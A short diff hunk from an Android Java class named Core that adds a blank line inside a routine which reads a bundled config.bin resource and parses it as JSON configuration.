@@ -474,6 +474,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (loadConf): TRY JSONCONF");
 			}
+			
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
 			String json = new String(resource);
 			// Initialize the configuration object
